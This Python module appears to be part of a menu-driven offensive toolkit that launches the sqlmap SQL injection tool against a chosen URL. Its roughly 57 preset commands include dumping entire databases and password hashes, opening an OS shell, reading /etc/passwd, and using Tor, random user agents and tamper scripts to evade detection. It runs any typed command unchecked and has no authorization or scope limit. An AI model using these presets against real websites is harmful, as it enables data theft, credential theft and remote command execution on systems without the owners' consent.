from utils import run_cmd, color_print, log_info, get_input, clear_screen

SQLMAP_PRESETS = [
    'sqlmap -u "{target}"',
    'sqlmap -u "{target}" --dbs',
    'sqlmap -u "{target}" --tables',
    'sqlmap -u "{target}" --columns',
    'sqlmap -u "{target}" --dump',
    'sqlmap -u "{target}" --dump-all',
    'sqlmap -u "{target}" --current-db',
    'sqlmap -u "{target}" --current-user',
    'sqlmap -u "{target}" --hostname',
    'sqlmap -u "{target}" --users',
    'sqlmap -u "{target}" --passwords',
    'sqlmap -u "{target}" --is-dba',
    'sqlmap -u "{target}" -b',
    'sqlmap -u "{target}" --banner',
    'sqlmap -u "{target}" --schema',
    'sqlmap -u "{target}" --search -T users',
    'sqlmap -u "{target}" --search -C password',
    'sqlmap -u "{target}" --search -D testdb',
    'sqlmap -u "{target}" --level=1 --risk=1',
    'sqlmap -u "{target}" --level=5 --risk=3',
    'sqlmap -u "{target}" --threads=10',
    'sqlmap -u "{target}" --random-agent',
    'sqlmap -u "{target}" --tor',
    'sqlmap -u "{target}" --check-tor',
    'sqlmap -u "{target}" --tamper=space2comment',
    'sqlmap -u "{target}" --tamper=between',
    'sqlmap -u "{target}" --dbms=mysql',
    'sqlmap -u "{target}" --technique=BEUSTQ',
    'sqlmap -u "{target}" --time-sec=5',
    'sqlmap -u "{target}" --union-cols=1-10',
    'sqlmap -u "{target}" --union-char=1',
    'sqlmap -u "{target}" --cookie="PHPSESSID=123"',
    'sqlmap -u "{target}" --headers="X-Forwarded-For: 127.0.0.1"',
    'sqlmap -u "{target}" --referer="http://google.com"',
    'sqlmap -u "{target}" --user-agent="Mozilla/5.0"',
    'sqlmap -u "{target}" --data="username=admin&password=admin"',
    'sqlmap -u "{target}" --method=POST',
    'sqlmap -u "{target}" -p id',
    'sqlmap -u "{target}" --skip=id',
    'sqlmap -u "{target}" --os-shell',
    'sqlmap -u "{target}" --sql-shell',
    'sqlmap -u "{target}" --file-read=/etc/passwd',
    'sqlmap -u "{target}" --crawl=3',
    'sqlmap -u "{target}" --forms',
    'sqlmap -u "{target}" --batch',
    'sqlmap -u "{target}" --flush-session',
    'sqlmap -u "{target}" --fresh-queries',
    'sqlmap -u "{target}" --hex',
    'sqlmap -u "{target}" --no-cast',
    'sqlmap -u "{target}" --eta',
    'sqlmap -u "{target}" --answers="follow=N"',
    'sqlmap --wizard',
    'sqlmap --update',
    'sqlmap --purge',
    'sqlmap --list-tampers',
    'sqlmap --list-techniques',
    'sqlmap --list-dbms',
]

def run_sqlmap(url):
    while True:
        clear_screen()
        color_print(f"--- SQLMap Advanced Presets [{url if url else 'No URL'}] ---", "BLUE")
        print(" [1] Quick Standard Scan (--batch --banner)")
        print(" [2] Browse All Presets (60+ Commands)")
        print(" [3] Custom Command Input")
        print(" [0] Back to Main Menu")
        print("-" * 50)
        
        choice = get_input("SQLMap")
        
        if choice == '1':
            if not url: url = get_input("Enter Target URL")
            run_cmd(["sqlmap", "-u", url, "--batch", "--banner", "--random-agent"])
            input("\nPress Enter...")
        elif choice == '2':
            if not url: url = "http://target.com/vuln.php?id=1"
            for i, cmd in enumerate(SQLMAP_PRESETS):
                print(f" [{i:02}] {cmd.format(target=url)}")
            
            p_choice = get_input("Preset # (or ENTER to cancel)")
            if p_choice.isdigit() and int(p_choice) < len(SQLMAP_PRESETS):
                actual_url = get_input(f"Confirm URL [{url}]") or url
                final_cmd = SQLMAP_PRESETS[int(p_choice)].format(target=actual_url)
                run_cmd(final_cmd)
                input("\nPress Enter...")
        elif choice == '3':
            custom = get_input("Enter Full SQLMap Command")
            if custom: run_cmd(custom)
            input("\nPress Enter...")
        elif choice == '0':
            break
